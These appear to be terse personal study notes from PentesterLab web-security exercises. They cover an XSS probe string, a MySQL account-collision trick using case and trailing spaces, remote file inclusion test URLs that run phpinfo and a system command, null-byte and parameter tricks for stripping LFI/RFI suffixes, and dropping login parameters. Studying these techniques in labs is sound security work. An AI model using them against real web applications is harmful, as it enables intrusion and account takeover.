XSS {{
1234'"<t>
//try this payload instead cause it is easier to see encodings and stuff
//then iterate
//look at source
//don't fuzz blindly

}}
Registration {{
Try with a capital letter of spaces afterward because mysql will lowercase and remove trailing spaces but code may not
}}
File Include {{
http://assets.pentesterlab.com/test_include.txt
//tests phpinfo

http://assets.pentesterlab.com/test_include_system.txt
//&c=uname+-a      shows system command


For LFI, you can get rid of the suffix using a NULL BYTE. For RFI, you can get rid of the suffix, by adding &blah= or ?blah= depending on your URL
PHP now correctly handles paths and they cannot be poisoned using a NULL BYTE, as they used to.
}}
login forms, check null values ( remove parameters )
